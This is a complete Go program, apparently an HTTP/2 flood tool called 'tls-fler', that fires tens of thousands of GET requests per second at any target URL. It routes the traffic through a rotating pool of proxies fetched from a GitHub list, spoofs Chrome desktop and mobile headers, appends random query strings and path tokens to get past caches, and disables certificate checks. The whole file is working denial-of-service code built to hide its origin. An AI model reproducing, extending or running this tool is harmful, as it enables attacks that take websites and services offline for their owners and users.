package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

// ── constants ─────────────────────────────────────────────────────────────────
const (
	proxyGitURL = "https://raw.githubusercontent.com/malasahjagotwin/restissue/refs/heads/master/proxy/global.txt"

	uaDesktop = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
	uaMobile  = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"

	secChUaVal      = `"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"`
	platformDesktop = `"Windows"`
	platformMobile  = `"Android"`

	mejiChars = "abcdefghijklmnopqrstuvwxyz0123456789"
)

var mejiSuffixes = []string{
	"", "App", "Load", "Ts", "Req", "Id", "Cache", "Rand", "Hit", "Src",
	"Tk", "Ver", "Sid", "Uid", "Tag", "Ctx", "Ref", "Env", "Run", "Seq",
}

// ── stats ─────────────────────────────────────────────────────────────────────
var (
	statTotal   int64
	statSuccess int64
	statFailed  int64
)

// ── proxy pool ────────────────────────────────────────────────────────────────
type proxy struct{ host, port, user, pass string }

type proxyPool struct {
	mu   sync.RWMutex
	list []proxy
	fp   string // fingerprint
}

func parseProxies(r io.Reader) []proxy {
	var out []proxy
	sc := bufio.NewScanner(r)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" {
			continue
		}
		p := strings.Split(line, ":")
		if len(p) < 2 {
			continue
		}
		px := proxy{host: p[0], port: p[1]}
		if len(p) >= 4 {
			px.user = p[2]
			px.pass = p[3]
		}
		out = append(out, px)
	}
	return out
}

func fingerprint(list []proxy) string {
	parts := make([]string, len(list))
	for i, p := range list {
		parts[i] = p.host + ":" + p.port
	}
	return strings.Join(parts, "|")
}

func newProxyPool(localPath string) (*proxyPool, error) {
	pp := &proxyPool{}

	// try GitHub first
	resp, err := http.Get(proxyGitURL)
	if err == nil && resp.StatusCode == 200 {
		list := parseProxies(resp.Body)
		resp.Body.Close()
		if len(list) > 0 {
			pp.list = list
			pp.fp = fingerprint(list)
			saveLocal(localPath, list)
			fmt.Printf("[proxy] loaded %d proxies from GitHub\n", len(list))
			return pp, nil
		}
	}

	// fallback to local
	f, err := os.Open(localPath)
	if err != nil {
		return nil, fmt.Errorf("cannot load proxies: %v", err)
	}
	defer f.Close()
	list := parseProxies(f)
	if len(list) == 0 {
		return nil, fmt.Errorf("proxy file is empty")
	}
	pp.list = list
	pp.fp = fingerprint(list)
	fmt.Printf("[proxy] loaded %d proxies from local file\n", len(list))
	return pp, nil
}

func saveLocal(path string, list []proxy) {
	f, err := os.Create(path)
	if err != nil {
		return
	}
	defer f.Close()
	for _, p := range list {
		if p.user != "" {
			fmt.Fprintf(f, "%s:%s:%s:%s\n", p.host, p.port, p.user, p.pass)
		} else {
			fmt.Fprintf(f, "%s:%s\n", p.host, p.port)
		}
	}
}

func (pp *proxyPool) autoUpdate(localPath string, interval time.Duration) {
	for range time.NewTicker(interval).C {
		resp, err := http.Get(proxyGitURL)
		if err != nil || resp.StatusCode != 200 {
			continue
		}
		list := parseProxies(resp.Body)
		resp.Body.Close()
		if len(list) == 0 {
			continue
		}
		newFP := fingerprint(list)
		pp.mu.Lock()
		if newFP != pp.fp {
			pp.list = list
			pp.fp = newFP
			fmt.Printf("[proxy] updated: %d proxies\n", len(list))
			saveLocal(localPath, list)
		}
		pp.mu.Unlock()
	}
}

func (pp *proxyPool) random() proxy {
	pp.mu.RLock()
	defer pp.mu.RUnlock()
	return pp.list[rand.Intn(len(pp.list))]
}

func (pp *proxyPool) len() int {
	pp.mu.RLock()
	defer pp.mu.RUnlock()
	return len(pp.list)
}

// ── random helpers ────────────────────────────────────────────────────────────
func randStr(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = mejiChars[rand.Intn(len(mejiChars))]
	}
	return string(b)
}

func resolveRand(s string) string {
	for strings.Contains(s, "%RAND%") {
		s = strings.Replace(s, "%RAND%", randStr(rand.Intn(9)+8), 1)
	}
	return s
}

func randomMejiQuery() string {
	n := rand.Intn(3) + 1
	pairs := make([]string, 0, n)
	used := map[string]bool{}
	for i := 0; i < n; i++ {
		var key string
		for {
			key = "meji" + mejiSuffixes[rand.Intn(len(mejiSuffixes))]
			if !used[key] {
				used[key] = true
				break
			}
		}
		pairs = append(pairs, key+"="+randStr(rand.Intn(8)+4))
	}
	return strings.Join(pairs, "&")
}

func appendQuery(rawURL string) string {
	q := randomMejiQuery()
	if strings.Contains(rawURL, "?") {
		return rawURL + "&" + q
	}
	si := strings.Index(rawURL, "://")
	if si >= 0 && !strings.Contains(rawURL[si+3:], "/") {
		return rawURL + "/?" + q
	}
	return rawURL + "?" + q
}

// ── proxy CONNECT tunnel → TLS → HTTP/2 ──────────────────────────────────────
// This is the correct approach: open raw TCP to proxy, send CONNECT,
// then wrap the same conn with TLS. golang.org/x/net/http2 is used
// to speak HTTP/2 over the established TLS connection.

func dialViaCONNECT(px proxy, targetHost string, targetPort int) (net.Conn, error) {
	addr := net.JoinHostPort(px.host, px.port)
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return nil, err
	}

	// send CONNECT
	connectLine := fmt.Sprintf("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n",
		targetHost, targetPort, targetHost, targetPort)
	if px.user != "" {
		auth := base64.StdEncoding.EncodeToString([]byte(px.user + ":" + px.pass))
		connectLine += "Proxy-Authorization: Basic " + auth + "\r\n"
	}
	connectLine += "Proxy-Connection: Keep-Alive\r\n\r\n"

	if _, err := conn.Write([]byte(connectLine)); err != nil {
		conn.Close()
		return nil, err
	}

	// read proxy response (wait for HTTP/1.1 200)
	br := bufio.NewReader(conn)
	resp, err := http.ReadResponse(br, nil)
	if err != nil {
		conn.Close()
		return nil, err
	}
	resp.Body.Close()
	if resp.StatusCode != 200 {
		conn.Close()
		return nil, fmt.Errorf("proxy CONNECT failed: %s", resp.Status)
	}

	return conn, nil
}

// ── request worker ────────────────────────────────────────────────────────────
func worker(pool *proxyPool, targetURL *url.URL, rate int, duration time.Duration, wg *sync.WaitGroup) {
	defer wg.Done()

	deadline := time.Now().Add(duration)
	port := 443
	if p := targetURL.Port(); p != "" {
		port, _ = strconv.Atoi(p)
	}

	for time.Now().Before(deadline) {
		px := pool.random()

		// 1. dial proxy CONNECT tunnel
		conn, err := dialViaCONNECT(px, targetURL.Hostname(), port)
		if err != nil {
			atomic.AddInt64(&statFailed, 1)
			continue
		}

		// 2. TLS handshake over the tunnelled conn
		tlsCfg := &tls.Config{
			ServerName:         targetURL.Hostname(),
			InsecureSkipVerify: true,
			NextProtos:         []string{"h2"},
			CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			},
		}
		tlsConn := tls.Client(conn, tlsCfg)
		if err := tlsConn.SetDeadline(time.Now().Add(10 * time.Second)); err != nil {
			conn.Close()
			atomic.AddInt64(&statFailed, 1)
			continue
		}
		if err := tlsConn.Handshake(); err != nil {
			tlsConn.Close()
			atomic.AddInt64(&statFailed, 1)
			continue
		}
		if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
			tlsConn.Close()
			atomic.AddInt64(&statFailed, 1)
			continue
		}
		tlsConn.SetDeadline(time.Time{}) // clear deadline

		// 3. HTTP/2 client transport over the TLS conn
		tr := &http2.Transport{
			DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
				return tlsConn, nil
			},
			TLSClientConfig: tlsCfg,
		}
		client := &http.Client{
			Transport: tr,
			Timeout:   15 * time.Second,
		}

		// 4. fire requests at ratelimit until deadline or error
		interval := time.Second / time.Duration(rate)
		for time.Now().Before(deadline) {
			rawURL := appendQuery(resolveRand(targetURL.String()))
			req, err := http.NewRequest("GET", rawURL, nil)
			if err != nil {
				break
			}

			isMobile := rand.Intn(100) < 40
			setHeaders(req, isMobile)

			atomic.AddInt64(&statTotal, 1)
			resp, err := client.Do(req)
			if err != nil {
				atomic.AddInt64(&statFailed, 1)
				break // proxy conn dead, get new one
			}
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()

			if resp.StatusCode >= 200 && resp.StatusCode < 500 {
				atomic.AddInt64(&statSuccess, 1)
			} else {
				atomic.AddInt64(&statFailed, 1)
			}

			time.Sleep(interval)
		}

		tlsConn.Close()
	}
}

func setHeaders(req *http.Request, isMobile bool) {
	var ua, platform, mobile string
	if isMobile {
		ua = uaMobile
		platform = platformMobile
		mobile = "?1"
	} else {
		ua = uaDesktop
		platform = platformDesktop
		mobile = "?0"
	}
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,id;q=0.8")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Sec-Ch-Ua", secChUaVal)
	req.Header.Set("Sec-Ch-Ua-Mobile", mobile)
	req.Header.Set("Sec-Ch-Ua-Platform", platform)
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Dnt", "1")
}

// ── main ──────────────────────────────────────────────────────────────────────
func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: tls-fler <url> <duration_seconds> <rate_per_second> [proxy/global.txt]")
		fmt.Println("Example: ./tls-fler https://example.com 60 50000")
		fmt.Println("         ./tls-fler https://example.com/%RAND% 60 50000 proxy/global.txt")
		os.Exit(1)
	}

	targetRaw := os.Args[1]
	duration, err := strconv.Atoi(os.Args[2])
	if err != nil || duration <= 0 {
		fmt.Println("Error: duration must be a positive integer")
		os.Exit(1)
	}
	rate, err := strconv.Atoi(os.Args[3])
	if err != nil || rate <= 0 {
		fmt.Println("Error: rate must be a positive integer")
		os.Exit(1)
	}

	localProxyPath := "proxy/global.txt"
	if len(os.Args) >= 5 {
		localProxyPath = os.Args[4]
	}

	targetURL, err := url.Parse(targetRaw)
	if err != nil {
		fmt.Printf("Error: invalid URL: %v\n", err)
		os.Exit(1)
	}

	pool, err := newProxyPool(localProxyPath)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		os.Exit(1)
	}

	// auto-update proxy every 30s
	go pool.autoUpdate(localProxyPath, 30*time.Second)

	// suppress unused import warning for hpack
	_ = hpack.NewEncoder

	dur := time.Duration(duration) * time.Second
	concurrency := rate / 10
	if concurrency < 1 {
		concurrency = 1
	}
	if concurrency > 5000 {
		concurrency = 5000
	}

	fmt.Printf("Starting HTTP/2 + proxy requests to %s\n", targetURL)
	fmt.Printf("Duration: %ds | Rate: %d req/s | Workers: %d | Proxies: %d\n\n",
		duration, rate, concurrency, pool.len())

	start := time.Now()
	var wg sync.WaitGroup

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		perWorkerRate := rate / concurrency
		if perWorkerRate < 1 {
			perWorkerRate = 1
		}
		go worker(pool, targetURL, perWorkerRate, dur, &wg)
	}

	wg.Wait()
	elapsed := time.Since(start).Seconds()

	fmt.Println("========== SUMMARY ==========")
	fmt.Printf("Target    : %s\n", targetURL)
	fmt.Printf("Duration  : %.2fs\n", elapsed)
	fmt.Printf("Total Req : %d\n", statTotal)
	fmt.Printf("Success   : %d\n", statSuccess)
	fmt.Printf("Failed    : %d\n", statFailed)
	fmt.Printf("Avg Rate  : %.2f req/s\n", float64(statTotal)/elapsed)
	fmt.Println("=============================")
}
